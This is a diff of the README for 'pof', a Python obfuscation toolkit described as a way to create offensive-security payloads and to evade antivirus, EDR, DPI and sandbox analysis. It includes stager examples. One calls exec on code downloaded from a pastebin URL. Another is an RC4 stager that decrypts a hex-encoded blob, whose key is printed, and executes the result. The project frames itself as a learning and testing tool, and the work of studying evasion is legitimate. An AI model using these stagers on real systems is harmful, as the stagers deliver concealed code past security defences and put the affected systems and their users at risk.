@@ -6,20 +6,44 @@ Combine and chain obfuscation methods on a single Python source file.
 
 ## Goals
 
-The goals of this project is to create a toolkit to obfuscate Python source code to create payload for offensive security:
+The goals of this project is to create a toolkit to obfuscate Python source code, mainly to create payload for offensive security.
 
-- **Payloads**: store the code inside images, have multiple stages, use LOTL techniques
-- **Stager**: easily create multi stages payloads
-- **Evasion**: AV, EDR, DPI, sandbox and other analysis techniques
-- **Human**: slow down human analysis of the payload
-- **Automation**: automate the whole process, to produce numerous variant of the payload
-- **Fun**: because it's always fun to see what's possible to do with Pythonnd
+pof will allow you to:
 
-Python is not exactly the best language to create payloads with, especially for Windows if it's not already installed. This project was made for learning, and discovering new ways of bypassing security, of obfuscating the same code, it's a great way to test obfuscations techniques.
+- create **payloads**: store the code inside images, have multiple stages, use LOTL techniques
+- create **stager**: easily create multi stages payloads
+- do **evasion**: AV, EDR, DPI, sandbox and other analysis techniques
+- slow **analysis**: slow down human analysis of the payload
+- enable **automation**: automate the whole process, to produce numerous variant of the payload
+- have **fun**: because it's always fun to see what's possible to do with Python
+
+Python is not exactly the best language to create payloads with, especially for Windows if the interpreter is not already installed. This project was made for learning, and discovering new ways of bypassing security, of obfuscating the same code, it's a great way to test obfuscations techniques.
 
 This project could also give you ideas to implement in other languages, such as powershell where it would make sens to obfuscate the source code. Or in C, C#, C++, Go or Rust where it would make sens to stage payloads, compress them, encrypt them and obfuscate strings.
 
 You could also use most of the stagers to stage payload that are not built in Python.
+
+## Shortcomings
+
+Note that any obfuscation techniques that adds code complexity will make the code run slower. For most applications this won't have an impact, and no one is using Python for speed anyway.
+
+Encoding, compression, encryption will slow the start of the programs, because it will first have to decode, de-compress, or decrypt it.
+
+Strings, numbers, builtin, obfuscators will make the code run slower, because they will add complexity to many parts of it.
+
+And finally the 'classical' techniques, names, definitions won't have an impact on the speed of the code, because they'll simply renames elements of the code.
+
+## Install
+
+```bash
+git clone https://github.com/2O4/pof
+cd pof
+python -m venv venv
+source ./venv/bin/activate
+./setup.py install
+```
+
+This will install pof inside a virtual env, so you'll need to activate it every times you want to use it.
 
 ## Usage
 
@@ -51,18 +75,6 @@ Using a specific payload:
 ```bash
 pof inf.py -o out.py -f payload GzipPayload
 ```
-
-## Install
-
-```bash
-git clone https://github.com/2O4/pof
-cd pof
-python -m venv venv
-source ./venv/bin/activate
-./setup.py install
-```
-
-This will install pof inside a virtual env, so you'll need to activate it every times you want to use it.
 
 ## Examples
 
@@ -357,7 +369,7 @@ exec(request.urlopen("http://link...").read())
 
 #### ImageStager
 
-Note that the modified picture is not included.
+The modified picture is not included in this example.
 
 ```python
 import sys
@@ -386,6 +398,57 @@ exec(decode(sys.argv.pop(1)))
 ```python
 from urllib import request
 exec(request.urlopen("https://pastebin.com/raw/...").read())
+```
+
+The `PasteRsStager` and `Cl1pNetStager` are exactly the same, but the code is not uploaded to the same site.
+
+#### RC4Stager
+
+The RC4 stager needs to be called with the key has it's first argument.
+
+```python
+import sys
+import codecs
+def rc4decrypt(key,ciphertext):
+    def KSA(key):
+        key_length=len(key)
+        S=list(range(256))
+        j=0
+        for i in range(256):
+            j=(j+S[i]+key[i%key_length])%256
+            S[i],S[j]=S[j],S[i]
+        return S
+    def PRGA(S):
+        i=0
+        j=0
+        while True:
+            i=(i+1)%256
+            j=(j+S[i])%256
+            S[i],S[j]=S[j],S[i]
+            K=S[(S[i]+S[j])%256]
+            yield K
+    def get_keystream(key):
+        S=KSA(key)
+        return PRGA(S)
+    def encrypt_logic(key,text):
+        key=[ord(c)for c in key]
+        keystream=get_keystream(key)
+        res=[]
+        for c in text:
+            val="%02X"%(c^next(keystream))
+            res.append(val)
+        return"".join(res)
+    ciphertext=codecs.decode(ciphertext,"hex_codec")
+    res=encrypt_logic(key,ciphertext)
+    return codecs.decode(res,"hex_codec").decode("utf-8")
+
+exec(rc4decrypt(sys.argv.pop(1),'A0E9F66914B121B6CD9A7E4532EF281DBB0B8D7FF597A4D5FA2C5EBB47BA2801B33B21819B1F62D5A5D2BDC1E4A4ACD159FB581F860F44D0E4F493C8F55858C83D19EF5DD1BBEB0D143E5C5C9FFF621B187985B6F9FC03E83F80BA3DCD55217949FA04B2F58EC862CC701A0734D1ADB231E5DA54C11E505F520D1B53E50E1F36AA20A163D2BFA43C3E5DDA259A12683C3379D4115C0483C088236FB5DA667EE79D288D99F73A07FCF3F445F933B637B26DD32CC0A0EBE646E7644D2324937910ECB4752E8CEDC09729AF476579944DC13E3629C42634C9483D89617F8941F68506470D53BCC6A94B592101260B96B1BFD83A6C2248E725FF31E4592D21038D677A239E1BA4F9031F7F728DE835BF0C8B28920868A6B880E37C2BBF5E37291210F15F389BF42522D6A9668BA334474D9048AE66997C0AED01178B2EA75DB4D592CBB898773D982A91242AB434F54F00E6B747940D8D0228CB885E8A4977494350FFFA2D2428D0525F8A5A6A22899B0195AD278E804B7BCC47B499DD32329C56B4DB7A6FA81DC935DA9978961604951F0F63757FA754291B32D8E03BE815A38A5EDACB04516AEEAD0F9BA2FB4D8C3E8F5050D810B3B94B1A445973E775114112D279673715858CBA8C4C745C8B9D78CFF81B5C151EACB2E739612C7776BC081B5CA54AF6860E6F04A80F5645B011F4A4'))
+```
+
+For this example, the randomly generated key is:
+
+```
+TzyaoOa2e4wimAo1AGgeWO5ztZtLzqWo5Wl9OXLWP0r5QmjFO8VvIao6NfqHxMBZCXekiqGDcmFugz10F2wS8UlOtUJB2muLsSxVWoJhq1fKWaZHbiYPd7SSdPhqHMRV1fQkJax5sLssaB43AlHFrx4rJYMvkCjPebHUdjW2l0c8af5cNs60v4dRE3zw2myNZTcrbsbpvogSGYOz21rAXlEZn2y0lbDIpWwI1ZHf8i5vAGxnPPPH9i7OQIMZEunerDbY7cyzHRcZGU1nsVyEmlILGf37NYTxLagRkC6GJP5NCmqboyP5It6bF6AuihUkjLTXTMvrgxfNlMs4g3BkHqZIGjNxFHj6zSB3jhOtOQ9l3zOG36dsMKSye78Xxmn7JjoW5nH76E05QJMBALapu0LaVppSSpSUrpYR2bmwGdbuJNZd7qLL6Yy6vNptSIKcG6Vi6DiFLk7afCw9h9fLdyUC1Ng1sGwt0Jhdf0XnuBedFx6diWYzCrYgWZeM1VnC
 ```
 
 #### QuineStager
@@ -544,3 +607,7 @@ ruff .
 - Publish package on pypi
 - Write a doc
 - Make project open-source
+
+## License
+
+pof is licensed under [GPLv3](./LICENSE).
